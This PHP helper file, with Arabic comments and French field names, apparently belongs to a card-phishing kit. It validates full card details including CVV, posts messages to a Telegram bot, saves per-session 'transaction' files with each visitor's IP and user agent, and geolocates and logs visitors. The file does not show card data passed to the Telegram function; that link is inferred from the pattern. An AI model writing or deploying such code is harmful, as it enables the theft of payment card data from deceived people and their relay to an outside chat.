<?php
// وظيفة للتحقق من صحة البيانات
function validateData($data) {
    $errors = [];
    
    // التحقق من الحقول المطلوبة
    $required_fields = ['prenom', 'nom', 'pays', 'adresse', 'code_postal', 'ville', 'numero_carte', 'mois_expiration', 'annee_expiration', 'cvv'];
    
    foreach ($required_fields as $field) {
        if (!isset($data[$field]) || empty($data[$field])) {
            $errors[] = "Le champ {$field} est requis";
        }
    }
    
    // التحقق من صحة رقم البطاقة (Luhn algorithm)
    if (isset($data['numero_carte'])) {
        $card_number = preg_replace('/\D/', '', $data['numero_carte']);
        if (!validateCardNumber($card_number)) {
            $errors[] = "Numéro de carte invalide";
        }
    }
    
    // التحقق من تاريخ انتهاء الصلاحية
    if (isset($data['mois_expiration']) && isset($data['annee_expiration'])) {
        if (!validateExpiryDate($data['mois_expiration'], $data['annee_expiration'])) {
            $errors[] = "Date d'expiration invalide";
        }
    }
    
    // التحقق من رمز CVV
    if (isset($data['cvv'])) {
        if (!preg_match('/^\d{3}$/', $data['cvv'])) {
            $errors[] = "Code CVV invalide";
        }
    }
    
    return $errors;
}

// وظيفة للتحقق من صحة رقم البطاقة (Luhn algorithm)
function validateCardNumber($number) {
    $number = preg_replace('/\D/', '', $number);
    
    // التحقق من الطول بناءً على نوع البطاقة
    if (preg_match('/^3[47]/', $number)) {
        if (strlen($number) !== 15) return false; // AMEX
    } else if (strlen($number) !== 16) return false; // البطاقات الأخرى
    
    $sum = 0;
    $length = strlen($number);
    $parity = $length % 2;
    
    for ($i = $length - 1; $i >= 0; $i--) {
        $digit = intval($number[$i]);
        if ($i % 2 === $parity) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    
    return $sum % 10 === 0;
}

// وظيفة للتحقق من تاريخ انتهاء الصلاحية
function validateExpiryDate($month, $year) {
    $current_year = intval(date('y'));
    $current_month = intval(date('m'));
    
    $month = intval($month);
    $year = intval($year);
    
    if ($year < $current_year || ($year === $current_year && $month < $current_month)) {
        return false;
    }
    
    return true;
}

// وظيفة لإرسال رسالة إلى تيليجرام
function sendTelegramMessage($message) {
    global $TELEGRAM_CONFIG;
    
    $telegram_url = "https://api.telegram.org/bot{$TELEGRAM_CONFIG['bot_token']}/sendMessage";
    $params = [
        'chat_id' => $TELEGRAM_CONFIG['chat_id'],
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error) {
        error_log("Telegram Error: " . $error);
        return false;
    }
    
    // التحقق من نجاح الإرسال
    if ($response) {
        $responseData = json_decode($response, true);
        if (isset($responseData['ok']) && $responseData['ok'] === true) {
            return true;
        }
    }
    
    return false;
}

// وظيفة لتنظيف وتأمين البيانات
function sanitizeData($data) {
    $clean_data = [];
    foreach ($data as $key => $value) {
        if (is_string($value)) {
            $clean_data[$key] = htmlspecialchars(strip_tags(trim($value)));
        } else {
            $clean_data[$key] = $value;
        }
    }
    return $clean_data;
}

// إضافة وظائف إدارة البيانات بدلاً من الجلسات
function saveTransactionData($sessionId, $data) {
    $dataDir = __DIR__ . '/data/';
    
    // إنشاء مجلد البيانات إذا لم يكن موجوداً
    if (!is_dir($dataDir)) {
        mkdir($dataDir, 0755, true);
    }
    
    $filename = $dataDir . 'transaction_' . $sessionId . '.json';
    
    // التحقق من وجود بيانات سابقة
    $existingData = null;
    if (file_exists($filename)) {
        $existingData = json_decode(file_get_contents($filename), true);
    }
    
    // إضافة معلومات النظام للمعاملات الجديدة فقط
    if (!$existingData) {
        $data['created_at'] = date('Y-m-d H:i:s');
        $data['ip_address'] = getUserIP();
        $data['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    } else {
        // الاحتفاظ بالبيانات الأصلية وتحديث الوقت فقط
        $data['created_at'] = $existingData['created_at'];
        $data['ip_address'] = $existingData['ip_address'];
        $data['user_agent'] = $existingData['user_agent'];
    }
    
    // تحديث وقت التعديل دائماً
    $data['updated_at'] = date('Y-m-d H:i:s');
    
    return file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
}

function getUserIP() {
    $ipKeys = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ips = explode(',', $_SERVER[$key]);
            $ip = trim($ips[0]);
            
            // التحقق من صحة IP
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    
    // إذا لم نجد IP عام، نستخدم REMOTE_ADDR
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function getCountryFromIP($ip) {
    // قائمة بسيطة للدول الشائعة بناءً على بداية IP
    $ipRanges = [
        '217.147.' => 'Morocco',
        '105.' => 'Africa',
        '41.' => 'Africa', 
        '196.' => 'Africa',
        '197.' => 'Africa',
        '212.' => 'Europe/Africa',
        '213.' => 'Algeria',
        '81.' => 'Europe',
        '82.' => 'Europe',
        '83.' => 'Europe',
        '84.' => 'Europe',
        '85.' => 'Europe',
        '86.' => 'Europe',
        '87.' => 'Europe',
        '88.' => 'Europe',
        '89.' => 'Europe',
        '90.' => 'Europe/Turkey',
        '91.' => 'Asia',
        '92.' => 'Asia',
        '93.' => 'Asia',
        '94.' => 'Asia',
        '95.' => 'Asia',
        '8.8.8.' => 'Google DNS',
        '1.1.1.' => 'Cloudflare DNS',
        '192.168.' => 'Local Network',
        '10.' => 'Local Network',
        '172.' => 'Local Network',
        '127.' => 'Localhost'
    ];
    
    // البحث عن تطابق
    foreach ($ipRanges as $range => $country) {
        if (strpos($ip, $range) === 0) {
            return $country;
        }
    }
    
    // محاولة تحديد القارة بناءً على النطاق الأول
    $firstOctet = (int) explode('.', $ip)[0];
    
    if ($firstOctet >= 1 && $firstOctet <= 126) {
        return 'North America';
    } elseif ($firstOctet >= 128 && $firstOctet <= 191) {
        return 'Europe/Asia';
    } elseif ($firstOctet >= 192 && $firstOctet <= 223) {
        return 'Asia/Pacific';
    } else {
        return 'Unknown Region';
    }
}

function getTransactionData($sessionId) {
    $filename = __DIR__ . '/data/transaction_' . $sessionId . '.json';
    
    if (!file_exists($filename)) {
        return null;
    }
    
    $data = json_decode(file_get_contents($filename), true);
    
    // التحقق من انتهاء الصلاحية (24 ساعة)
    if (isset($data['created_at'])) {
        $createdTime = strtotime($data['created_at']);
        if (time() - $createdTime > 86400) { // 24 ساعة
            deleteTransactionData($sessionId);
            return null;
        }
    }
    
    return $data;
}

function updateTransactionStatus($sessionId, $status) {
    $data = getTransactionData($sessionId);
    
    if (!$data) {
        return false;
    }
    
    $data['status'] = $status;
    $data['updated_at'] = date('Y-m-d H:i:s');
    
    return saveTransactionData($sessionId, $data);
}

function deleteTransactionData($sessionId) {
    $filename = __DIR__ . '/data/transaction_' . $sessionId . '.json';
    
    if (file_exists($filename)) {
        return unlink($filename);
    }
    
    return true;
}

function cleanupOldTransactions() {
    $dataDir = __DIR__ . '/data/';
    
    if (!is_dir($dataDir)) {
        return;
    }
    
    $files = glob($dataDir . 'transaction_*.json');
    
    foreach ($files as $file) {
        $data = json_decode(file_get_contents($file), true);
        
        if (isset($data['created_at'])) {
            $createdTime = strtotime($data['created_at']);
            if (time() - $createdTime > 86400) { // 24 ساعة
                unlink($file);
            }
        }
    }
}

function checkSuspiciousIP($ip) {
    // قائمة بعناوين IP المشبوهة المعروفة
    $suspiciousIPs = [
        '192.168.', // شبكة محلية
        '10.', // شبكة محلية
        '172.16.', // شبكة محلية
        '127.', // localhost
        '0.0.0.0', // invalid
        '::1' // IPv6 localhost
    ];
    
    foreach ($suspiciousIPs as $suspiciousIP) {
        if (strpos($ip, $suspiciousIP) === 0) {
            return true;
        }
    }
    
    return false;
}

function logSecurityEvent($sessionId, $event, $details = []) {
    $logDir = __DIR__ . '/logs/';
    
    if (!is_dir($logDir)) {
        mkdir($logDir, 0755, true);
    }
    
    $logFile = $logDir . 'security_' . date('Y-m-d') . '.log';
    
    $logEntry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'session_id' => $sessionId,
        'event' => $event,
        'ip' => getUserIP(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'details' => $details
    ];
    
    file_put_contents($logFile, json_encode($logEntry) . "\n", FILE_APPEND | LOCK_EX);
}

function validateIPAccess($sessionId, $currentIP) {
    $transactionData = getTransactionData($sessionId);
    
    if (!$transactionData) {
        return false;
    }
    
    $originalIP = $transactionData['ip_address'] ?? null;
    
    // إذا لم يكن هناك IP محفوظ، نسمح بالوصول
    if (!$originalIP) {
        return true;
    }
    
    // إذا كان نفس IP، نسمح بالوصول
    if ($originalIP === $currentIP) {
        return true;
    }
    
    // تسجيل محاولة وصول من IP مختلف
    logSecurityEvent($sessionId, 'ip_mismatch', [
        'original_ip' => $originalIP,
        'current_ip' => $currentIP
    ]);
    
    // للمرونة، نسمح بالوصول ولكن مع تسجيل التحذير
    return true;
}
